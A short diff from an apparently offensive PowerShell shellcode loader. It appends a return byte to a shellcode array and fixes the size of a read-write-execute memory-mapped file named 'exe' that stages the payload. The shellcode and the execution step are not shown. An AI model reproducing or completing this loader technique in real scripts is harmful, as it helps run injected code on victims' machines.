@@ -58,7 +58,7 @@ $shellcode += $shellcodeadd
 $shellcode += [byte[]]@(0xC3)
 
 #Create MMF w/ RWX & length of shellcode, with MMF name 'exe'
-[System.IO.MemoryMappedFiles.MemoryMappedFile]$mmfml = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([string]'exe', [long]$shellcodeadd.length,
+[System.IO.MemoryMappedFiles.MemoryMappedFile]$mmfml = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([string]'exe', [long]$shellcode.length,
 [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute, [System.IO.MemoryMappedFiles.MemoryMappedFileOptions]::None, 
 [System.IO.MemoryMappedFiles.MemoryMappedFileSecurity]::new(), [System.IO.HandleInheritability]::Inheritable)
 
